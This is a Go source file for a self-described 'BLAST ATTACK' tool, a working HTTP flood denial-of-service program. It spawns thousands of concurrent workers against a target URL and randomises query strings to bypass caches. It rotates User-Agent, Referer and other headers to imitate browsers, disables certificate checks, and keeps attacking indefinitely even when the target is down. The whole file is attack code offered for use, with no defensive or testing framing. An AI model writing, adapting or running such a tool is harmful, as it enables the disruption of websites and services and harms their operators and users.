package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"sync/atomic"
	"syscall"
	"time"
)

type AttackConfig struct {
	TargetURL  string
	Threads    int
	Duration   int
	Rate       int
	UserAgents []string
	BlastMode  bool
}

type AttackStats struct {
	SuccessCount int64
	ErrorCount   int64
	TotalBytes   int64
	StartTime    time.Time
	RequestCount int64
}

var (
	stats      AttackStats
	httpClient *http.Client
	stopChan   chan struct{}
	blastMode  bool
)

func init() {
	// ULTRA HEAVY CIPHER SUITES - Maximum CPU exhaustion
	cipherSuites := []uint16{
		tls.TLS_AES_256_GCM_SHA384,
		tls.TLS_CHACHA20_POLY1305_SHA256,
		tls.TLS_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
		tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,
		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
		tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
		tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_RSA_WITH_AES_256_CBC_SHA,
		tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA,
		tls.TLS_RSA_WITH_3DES_EDE_CBC_SHA,
	}

	httpClient = &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				CipherSuites:       cipherSuites,
				CurvePreferences: []tls.CurveID{
					tls.CurveP521,
					tls.CurveP384,
					tls.X25519,
					tls.CurveP256,
				},
				MinVersion:         tls.VersionTLS12,
				MaxVersion:         tls.VersionTLS13,
			},
			DisableKeepAlives:   false,
			DisableCompression:  false,
			MaxIdleConns:        0,
			MaxIdleConnsPerHost: 100000,
			MaxConnsPerHost:     0,
			IdleConnTimeout:     120 * time.Second,
			TLSHandshakeTimeout: 15 * time.Second,
			DialContext: (&net.Dialer{
				Timeout:   30 * time.Second, // Longer timeout for BLAST mode
				KeepAlive: 60 * time.Second,
				DualStack: true,
			}).DialContext,
			ForceAttemptHTTP2: true,
		},
		Timeout: 0, // No timeout - BLAST mode
	}

	stopChan = make(chan struct{})
}

func main() {
	target := flag.String("target", "", "Target URL (required)")
	threads := flag.Int("threads", 1000, "Number of concurrent threads")
	duration := flag.Int("duration", 0, "Attack duration in seconds (0 = unlimited)")
	rate := flag.Int("rate", 100, "Requests per second per thread")
	blast := flag.Bool("blast", true, "Enable BLAST mode - never stop even if target down")

	flag.Parse()

	if *target == "" {
		printUsage()
		os.Exit(1)
	}

	config := &AttackConfig{
		TargetURL: *target,
		Threads:   *threads,
		Duration:  *duration,
		Rate:      *rate,
		BlastMode: *blast,
	}

	blastMode = *blast
	initUserAgents(config)
	setupSignalHandler()
	printBanner(config)

	stats.StartTime = time.Now()
	startBlastAttack(config)
}

func printUsage() {
	fmt.Println("X BLAST ATTACK v3.0 - ULTIMATE PERSISTENCE")
	fmt.Println("Usage: ./blast -target https://example.com [options]")
	fmt.Println("\nOptions:")
	flag.PrintDefaults()
	fmt.Println("\nBLAST Mode Features:")
	fmt.Println("  🚀 Never stops - Continues even if target is completely down")
	fmt.Println("  💥 Maximum persistence - Infinite retry logic")
	fmt.Println("  🔥 Resource exhaustion - Full system utilization")
	fmt.Println("\nExample:")
	fmt.Println("  ./blast -target https://example.com -threads 5000 -rate 50 -blast")
}

func printBanner(config *AttackConfig) {
	fmt.Println("\n" + strings.Repeat("═", 70))
	fmt.Println("                X BLAST ATTACK v3.0 - ULTIMATE PERSISTENCE")
	fmt.Println("                     NEVER STOP ATTACK MODE")
	fmt.Println(strings.Repeat("═", 70))
	fmt.Printf("🎯 Target:    %s\n", config.TargetURL)
	fmt.Printf("🚀 Threads:   %d\n", config.Threads)
	fmt.Printf("📊 Rate:      %d requests/sec/thread\n", config.Rate)
	fmt.Printf("💥 BLAST Mode: %v\n", config.BlastMode)
	
	if config.Duration > 0 {
		fmt.Printf("⏱️  Duration:  %d seconds\n", config.Duration)
	} else {
		fmt.Printf("⏱️  Duration:  UNLIMITED (BLAST MODE)\n")
	}
	
	fmt.Printf("⚡ CPU Cores: %d\n", runtime.NumCPU())
	fmt.Printf("🔥 Strategy:  Maximum persistence - Attack continues indefinitely\n")
	fmt.Println("\n🟢 Status:    LAUNCHING BLAST ATTACK - WILL NEVER STOP...")
	fmt.Println(strings.Repeat("═", 70))
}

func initUserAgents(config *AttackConfig) {
	config.UserAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/119.0.0.0",
	}
}

func randomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, length)
	for i := range result {
		result[i] = charset[rand.Intn(len(charset))]
	}
	return string(result)
}

func startBlastAttack(config *AttackConfig) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	fmt.Printf("🚀 Launching %d attack threads with BLAST mode...\n", config.Threads)
	
	// Launch all attack threads with BLAST mode
	for i := 0; i < config.Threads; i++ {
		go blastWorker(config, i)
		
		// Stagger thread creation to avoid instant burst
		if i%100 == 0 {
			time.Sleep(10 * time.Millisecond)
		}
	}

	// Duration timer (optional - BLAST mode ignores this if not set)
	if config.Duration > 0 {
		go func() {
			time.Sleep(time.Duration(config.Duration) * time.Second)
			fmt.Println("\n\n⏱️  Attack duration completed. Stopping...")
			close(stopChan)
		}()
	} else {
		fmt.Println("🔴 BLAST MODE: Attack will continue indefinitely until manually stopped")
	}

	// Statistics printer
	go printBlastStats()

	// Resource monitor
	go resourceMonitor()

	fmt.Println("✅ All threads launched. BLAST ATTACK ACTIVE!")
	fmt.Println("💥 Press Ctrl+C to stop the attack\n")

	// Wait for stop signal (might never come in BLAST mode)
	<-stopChan
	printFinalBlastStats()
	os.Exit(0)
}

// BLAST WORKER - ULTIMATE PERSISTENCE
func blastWorker(config *AttackConfig, workerID int) {
	errorCount := 0
	consecutiveErrors := 0
	maxConsecutiveErrors := 10000 // Very high limit for BLAST mode
	
	// Rate limiter for controlled attack
	ticker := time.NewTicker(time.Second / time.Duration(config.Rate))
	defer ticker.Stop()

	for {
		select {
		case <-stopChan:
			return
		case <-ticker.C:
			success := fireBlastRequest(config, workerID)
			atomic.AddInt64(&stats.RequestCount, 1)
			
			if !success {
				errorCount++
				consecutiveErrors++
				
				// BLAST MODE: Never stop, just adapt
				if consecutiveErrors > maxConsecutiveErrors {
					consecutiveErrors = 0 // Reset to avoid overflow
				}
				
				// Adaptive recovery - minimal delay even in total failure
				if errorCount > 100 {
					// Very short backoff even in complete failure
					time.Sleep(100 * time.Millisecond)
				}
			} else {
				errorCount = 0
				consecutiveErrors = 0
			}
			
			// BLAST MODE: Always continue regardless of errors
		}
	}
}

func fireBlastRequest(config *AttackConfig, workerID int) bool {
	url := buildBlastURL(config.TargetURL)

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		atomic.AddInt64(&stats.ErrorCount, 1)
		return false
	}

	// Dynamic headers for each request
	randomizeBlastHeaders(req, config)

	// Custom client with longer timeouts for BLAST mode
	client := &http.Client{
		Timeout: 45 * time.Second, // Longer timeout for persistent attacks
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
			DisableKeepAlives:   false,
			MaxIdleConnsPerHost: 1000,
			IdleConnTimeout:     90 * time.Second,
		},
	}

	resp, err := client.Do(req)
	if err != nil {
		atomic.AddInt64(&stats.ErrorCount, 1)
		return false
	}

	if resp.Body != nil {
		n, _ := io.Copy(io.Discard, resp.Body)
		atomic.AddInt64(&stats.TotalBytes, n)
		resp.Body.Close()
	}

	atomic.AddInt64(&stats.SuccessCount, 1)
	return true
}

func buildBlastURL(baseURL string) string {
	separator := "?"
	if strings.Contains(baseURL, "?") {
		separator = "&"
	}

	// Enhanced cache busting with more parameters
	randomParams := fmt.Sprintf("%s_rnd=%d&_t=%d&_cb=%s&_v=%d&_r=%s&_s=%x",
		separator,
		rand.Int63(),
		time.Now().UnixNano(),
		randomString(12),
		rand.Intn(1000),
		randomString(8),
		rand.Uint64())

	return baseURL + randomParams
}

func randomizeBlastHeaders(req *http.Request, config *AttackConfig) {
	// Random User-Agent
	req.Header.Set("User-Agent", config.UserAgents[rand.Intn(len(config.UserAgents))])
	
	// Accept headers
	acceptTypes := []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/avif,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"application/json,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	}
	req.Header.Set("Accept", acceptTypes[rand.Intn(len(acceptTypes))])
	
	// Language variations
	languages := []string{
		"en-US,en;q=0.9",
		"en-US,en;q=0.9,id;q=0.8",
		"en-GB,en;q=0.9,en-US;q=0.8",
		"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
	}
	req.Header.Set("Accept-Language", languages[rand.Intn(len(languages))])
	
	// Compression
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	
	// Connection management
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Keep-Alive", "timeout=60, max=1000")
	
	// Cache control variations
	cacheControls := []string{
		"no-cache",
		"no-cache, no-store, must-revalidate",
		"max-age=0",
		"private, max-age=0",
	}
	req.Header.Set("Cache-Control", cacheControls[rand.Intn(len(cacheControls))])
	req.Header.Set("Pragma", "no-cache")
	
	// Modern security headers
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	
	// Random referer
	if rand.Intn(10) > 2 {
		referers := []string{
			"https://www.google.com/",
			"https://www.bing.com/",
			"https://www.youtube.com/",
			"https://www.facebook.com/",
			"",
		}
		req.Header.Set("Referer", referers[rand.Intn(len(referers))])
	}
}

func printBlastStats() {
	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-stopChan:
			return
		case <-ticker.C:
			success := atomic.LoadInt64(&stats.SuccessCount)
			errors := atomic.LoadInt64(&stats.ErrorCount)
			bytes := atomic.LoadInt64(&stats.TotalBytes)
			requests := atomic.LoadInt64(&stats.RequestCount)
			duration := time.Since(stats.StartTime)
			rps := float64(success) / duration.Seconds()
			
			successRate := 0.0
			if requests > 0 {
				successRate = float64(success) / float64(requests) * 100
			}

			fmt.Printf("\r🔥 RPS: %.0f | ✅: %d | ❌: %d | 📊: %.1f MB | ⏱️: %.0fs | 🎯: %.1f%% | 💥: BLAST MODE",
				rps, success, errors, float64(bytes)/(1024*1024), duration.Seconds(), successRate)
		}
	}
}

func resourceMonitor() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-stopChan:
			return
		case <-ticker.C:
			var m runtime.MemStats
			runtime.ReadMemStats(&m)
			
			fmt.Printf("\n💾 Memory: %.1fMB | 🧵 Goroutines: %d\n", 
				float64(m.Alloc)/1024/1024, runtime.NumGoroutine())
		}
	}
}

func printFinalBlastStats() {
	duration := time.Since(stats.StartTime)
	success := atomic.LoadInt64(&stats.SuccessCount)
	errors := atomic.LoadInt64(&stats.ErrorCount)
	requests := atomic.LoadInt64(&stats.RequestCount)
	bytes := atomic.LoadInt64(&stats.TotalBytes)
	
	rps := float64(success) / duration.Seconds()
	successRate := 0.0
	if requests > 0 {
		successRate = float64(success) / float64(requests) * 100
	}

	fmt.Printf("\n\n" + strings.Repeat("═", 70) + "\n")
	fmt.Println("                    BLAST ATTACK COMPLETED")
	fmt.Println("                     ULTIMATE PERSISTENCE")
	fmt.Println(strings.Repeat("═", 70))
	fmt.Printf("✅ Successful Requests:  %d\n", success)
	fmt.Printf("❌ Failed Requests:      %d\n", errors)
	fmt.Printf("📊 Total Attempts:       %d\n", requests)
	fmt.Printf("🎯 Success Rate:         %.1f%%\n", successRate)
	fmt.Printf("📦 Data Transferred:     %.1f MB\n", float64(bytes)/(1024*1024))
	fmt.Printf("⏱️  Duration:             %.1f seconds\n", duration.Seconds())
	fmt.Printf("🚀 Average RPS:          %.0f requests/second\n", rps)
	fmt.Printf("💥 BLAST Mode:           COMPLETED\n")
	fmt.Printf("🔥 Persistence:          MAXIMUM\n")
	fmt.Println(strings.Repeat("═", 70))
	
	if blastMode {
		fmt.Println("🔴 BLAST MODE: Attack would have continued indefinitely")
	}
}

func setupSignalHandler() {
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-c
		fmt.Println("\n\n🛑 BLAST ATTACK stopped by user")
		close(stopChan)
	}()
}
